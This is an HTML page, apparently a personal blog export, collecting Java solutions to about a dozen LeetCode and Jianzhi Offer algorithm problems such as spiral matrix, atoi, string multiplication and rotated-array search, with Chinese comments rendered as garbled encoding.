<h3 id="59-èºæ—‹çŸ©é˜µ-II-x2F"><a href="#59-èºæ—‹çŸ©é˜µ-II-x2F" class="headerlink" title="59. èºæ—‹çŸ©é˜µ II&#x2F;"></a><a href="https://leetcode-cn.com/problems/spiral-matrix-ii/">59. èºæ—‹çŸ©é˜µ II</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> n * n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span>  <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">top</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">bottom</span> <span class="operator">=</span> n;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (start &lt;= sum) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt; right; i++) &#123;</span><br><span class="line">                res[top][i] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> top; i &lt; bottom; i++) &#123;</span><br><span class="line">                res[i][right - <span class="number">1</span>] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> right - <span class="number">1</span>; i &gt;= left; i--) &#123;</span><br><span class="line">                res[bottom - <span class="number">1</span>][i] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            bottom--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> bottom - <span class="number">1</span>; i &gt;= top; i--) &#123;</span><br><span class="line">                res[i][left] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="33-æœç´¢æ—‹è½¬æ’åºæ•°ç»„-x2F"><a href="#33-æœç´¢æ—‹è½¬æ’åºæ•°ç»„-x2F" class="headerlink" title="33. æœç´¢æ—‹è½¬æ’åºæ•°ç»„&#x2F;"></a><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/">33. æœç´¢æ—‹è½¬æ’åºæ•°ç»„</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// äºŒåˆ†æŸ¥æ‰¾</span></span><br><span class="line"><span class="comment">// å°†æ•°ç»„ä¸€åˆ†ä¸ºäºŒï¼Œå…¶ä¸­ä¸€å®šæœ‰ä¸€ä¸ªæ˜¯æœ‰åºçš„ï¼Œå¦ä¸€ä¸ªå¯èƒ½æ˜¯æœ‰åºï¼Œä¹Ÿèƒ½æ˜¯éƒ¨åˆ†æœ‰åºã€‚æ­¤æ—¶æœ‰åºéƒ¨åˆ†ç”¨äºŒåˆ†æ³•æŸ¥æ‰¾ã€‚æ— åºéƒ¨åˆ†å†ä¸€åˆ†ä¸ºäºŒï¼Œå…¶ä¸­ä¸€ä¸ªä¸€å®šæœ‰åºï¼Œå¦ä¸€ä¸ªå¯èƒ½æœ‰åºï¼Œå¯èƒ½æ— åºã€‚å°±è¿™æ ·å¾ªç¯.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + ((r - l) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[l] &lt; nums[mid]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[l] &lt;= target &amp;&amp; target &lt; nums[mid]) &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[r] &gt;= target &amp;&amp; target &gt; nums[mid]) &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="674-æœ€é•¿è¿ç»­é€’å¢åºåˆ—-x2F"><a href="#674-æœ€é•¿è¿ç»­é€’å¢åºåˆ—-x2F" class="headerlink" title="674. æœ€é•¿è¿ç»­é€’å¢åºåˆ—&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-continuous-increasing-subsequence/">674. æœ€é•¿è¿ç»­é€’å¢åºåˆ—</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findLengthOfLCIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                tmp++;</span><br><span class="line">                res = Math.max(res, tmp);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-å­—ç¬¦ä¸²è½¬æ¢æ•´æ•°-atoi"><a href="#8-å­—ç¬¦ä¸²è½¬æ¢æ•´æ•°-atoi" class="headerlink" title="8. å­—ç¬¦ä¸²è½¬æ¢æ•´æ•° (atoi)"></a><a href="https://leetcode-cn.com/problems/string-to-integer-atoi/">8. å­—ç¬¦ä¸²è½¬æ¢æ•´æ•° (atoi)</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">myAtoi</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> str.length();</span><br><span class="line">    <span class="type">char</span>[] s = str.toCharArray();</span><br><span class="line">    <span class="comment">// å»æ‰å‰å¯¼ç©ºæ ¼</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &lt; len &amp;&amp; s[index] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">      index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// é’ˆå¯¹å…¨æ˜¯ç©ºæ ¼çš„æƒ…å†µ</span></span><br><span class="line">    <span class="keyword">if</span> (index == len) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¦‚æœå‡ºç°ç¬¦å·å­—ç¬¦,ä»…ç¬¬ä¸€ä¸ªæœ‰æ•ˆ,å¹¶è®°å½•æ­£è´Ÿ</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sign</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> <span class="variable">firstChar</span> <span class="operator">=</span> s[index];</span><br><span class="line">    <span class="keyword">if</span> (firstChar == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">      index++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (firstChar == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">      index++;</span><br><span class="line">      sign = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">// å°†åç»­å‡ºç°çš„æ•°å­—å­—ç¬¦è¿›è¡Œè½¬æ¢</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &lt; len) &#123;</span><br><span class="line">      <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s[index];</span><br><span class="line">      <span class="comment">// åˆ¤æ–­ä¸åˆæ³•æƒ…å†µ</span></span><br><span class="line">      <span class="keyword">if</span> (c &gt; <span class="string">&#x27;9&#x27;</span> || c &lt; <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// åˆ¤æ–­èŒƒå›´</span></span><br><span class="line">      <span class="keyword">if</span> (res &gt; Integer.MAX_VALUE / <span class="number">10</span> || (res == Integer.MAX_VALUE / <span class="number">10</span>) &amp;&amp; (c - <span class="string">&#x27;0&#x27;</span>) &gt; Integer.MAX_VALUE % <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (res &lt; Integer.MIN_VALUE / <span class="number">10</span> || (res == Integer.MIN_VALUE / <span class="number">10</span>) &amp;&amp; ((c - <span class="string">&#x27;0&#x27;</span>) &gt; -(Integer.MIN_VALUE % <span class="number">10</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.MIN_VALUE;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// å¼€å§‹è½¬æ¢</span></span><br><span class="line">      res = res * <span class="number">10</span> + sign * (c - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">      index++;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="43-å­—ç¬¦ä¸²ç›¸ä¹˜"><a href="#43-å­—ç¬¦ä¸²ç›¸ä¹˜" class="headerlink" title="43. å­—ç¬¦ä¸²ç›¸ä¹˜"></a><a href="https://leetcode-cn.com/problems/multiply-strings/">43. å­—ç¬¦ä¸²ç›¸ä¹˜</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">multiply</span><span class="params">(String num1, String num2)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> num1.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> num2.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[m + n + <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> m + n + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> m; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">mul</span> <span class="operator">=</span> (num2.charAt(i) - <span class="string">&#x27;0&#x27;</span>) * (num1.charAt(j) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                index = i + j + <span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> (res[index] + mul) /  <span class="number">10</span>;</span><br><span class="line">                res[index] = (res[index] + mul) % <span class="number">10</span>;</span><br><span class="line">                index--;</span><br><span class="line">                res[index] += carry;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; res.length - <span class="number">1</span> &amp;&amp; res[i] == <span class="number">0</span>) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; res.length; i++) &#123;</span><br><span class="line">            sb.append(res[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="557-åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯-III"><a href="#557-åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯-III" class="headerlink" title="557. åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯ III"></a><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/">557. åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯ III</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¯¹äºjavaè€Œè¨€ï¼ŒStringæ˜¯ä¸å¯å˜å­—ç¬¦æ•°ç»„ï¼Œæ‰€ä»¥æ— æ³•é¿å…ç©ºé—´çš„å¼€é”€</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨é¢å¤–çš„ç©ºé—´</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        String[] s1 = s.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (String s2:</span><br><span class="line">             s1) &#123;</span><br><span class="line">            stringBuilder.append(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(s2).reverse().toString());</span><br><span class="line">            stringBuilder.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString().trim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="238-é™¤è‡ªèº«ä»¥å¤–æ•°ç»„çš„ä¹˜ç§¯"><a href="#238-é™¤è‡ªèº«ä»¥å¤–æ•°ç»„çš„ä¹˜ç§¯" class="headerlink" title="238. é™¤è‡ªèº«ä»¥å¤–æ•°ç»„çš„ä¹˜ç§¯"></a><a href="https://leetcode-cn.com/problems/product-of-array-except-self/">238. é™¤è‡ªèº«ä»¥å¤–æ•°ç»„çš„ä¹˜ç§¯</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¹˜ç§¯ = å½“å‰æ•°å·¦è¾¹çš„ä¹˜ç§¯ * å½“å‰æ•°å³è¾¹çš„ä¹˜ç§¯</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span>[] productExceptSelf(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">    <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">      res[i] = k;</span><br><span class="line">      k = k * nums[i]; <span class="comment">// æ­¤æ—¶æ•°ç»„å­˜å‚¨çš„æ˜¯é™¤å»å½“å‰å…ƒç´ å·¦è¾¹çš„å…ƒç´ ä¹˜ç§¯</span></span><br><span class="line">    &#125;</span><br><span class="line">    k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> nums.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">      res[i] *= k;<span class="comment">// kä¸ºè¯¥æ•°å³è¾¹çš„ä¹˜ç§¯ã€‚</span></span><br><span class="line"></span><br><span class="line">      k = nums[i] * k;<span class="comment">// æ­¤æ—¶æ•°ç»„ç­‰äºå·¦è¾¹çš„ * è¯¥æ•°å³è¾¹çš„ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="16-æœ€æ¥è¿‘çš„ä¸‰æ•°ä¹‹å’Œ"><a href="#16-æœ€æ¥è¿‘çš„ä¸‰æ•°ä¹‹å’Œ" class="headerlink" title="16. æœ€æ¥è¿‘çš„ä¸‰æ•°ä¹‹å’Œ"></a><a href="https://leetcode-cn.com/problems/3sum-closest/">16. æœ€æ¥è¿‘çš„ä¸‰æ•°ä¹‹å’Œ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŒæŒ‡é’ˆ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">threeSumClosest</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> nums[<span class="number">0</span>] + nums[<span class="number">2</span>] + nums[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[l] + nums[r];</span><br><span class="line">                <span class="keyword">if</span> (Math.abs(sum - target) &lt; Math.abs(min - target)) &#123;</span><br><span class="line">                    min = sum;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">                    r--;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; target)&#123;</span><br><span class="line">                    ++l;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> min;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-58-I-ç¿»è½¬å•è¯é¡ºåº"><a href="#å‰‘æŒ‡-Offer-58-I-ç¿»è½¬å•è¯é¡ºåº" class="headerlink" title="å‰‘æŒ‡ Offer 58 - I. ç¿»è½¬å•è¯é¡ºåº"></a><a href="https://leetcode-cn.com/problems/fan-zhuan-dan-ci-shun-xu-lcof/">å‰‘æŒ‡ Offer 58 - I. ç¿»è½¬å•è¯é¡ºåº</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        String[] s1 = s.trim().split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s1.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s1[i].equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                sb.append(s1[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sb.append(s1[i]).append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-53-II-0ï½n-1ä¸­ç¼ºå¤±çš„æ•°å­—"><a href="#å‰‘æŒ‡-Offer-53-II-0ï½n-1ä¸­ç¼ºå¤±çš„æ•°å­—" class="headerlink" title="å‰‘æŒ‡ Offer 53 - II. 0ï½n-1ä¸­ç¼ºå¤±çš„æ•°å­—"></a><a href="https://leetcode-cn.com/problems/que-shi-de-shu-zi-lcof/">å‰‘æŒ‡ Offer 53 - II. 0ï½n-1ä¸­ç¼ºå¤±çš„æ•°å­—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">missingNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] != mid) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">return</span> <span class="variable">left</span> <span class="operator">=</span>= nums.length - <span class="number">1</span> &amp;&amp; nums[left] == left ? nums.length : left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="448-æ‰¾åˆ°æ‰€æœ‰æ•°ç»„ä¸­æ¶ˆå¤±çš„æ•°å­—"><a href="#448-æ‰¾åˆ°æ‰€æœ‰æ•°ç»„ä¸­æ¶ˆå¤±çš„æ•°å­—" class="headerlink" title="448. æ‰¾åˆ°æ‰€æœ‰æ•°ç»„ä¸­æ¶ˆå¤±çš„æ•°å­—"></a><a href="https://leetcode-cn.com/problems/find-all-numbers-disappeared-in-an-array/">448. æ‰¾åˆ°æ‰€æœ‰æ•°ç»„ä¸­æ¶ˆå¤±çš„æ•°å­—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åŸåœ°æ“ä½œ, å–ä½™</span></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">findDisappearedNumbers</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> (num - <span class="number">1</span>) % n;</span><br><span class="line">            nums[x] += n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= n) &#123;</span><br><span class="line">                res.add(i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="415-å­—ç¬¦ä¸²ç›¸åŠ "><a href="#415-å­—ç¬¦ä¸²ç›¸åŠ " class="headerlink" title=" 415. å­—ç¬¦ä¸²ç›¸åŠ "></a><a href="https://leetcode-cn.com/problems/add-strings"> 415. å­—ç¬¦ä¸²ç›¸åŠ </a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">addStrings</span><span class="params">(String num1, String num2)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] nc1 = num1.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] nc2 = num2.toCharArray();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>, i = nc1.length - <span class="number">1</span>, j = nc2.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span> || carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                carry += nc1[i--] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                carry += nc2[j--] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(carry % <span class="number">10</span>);</span><br><span class="line">            carry /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

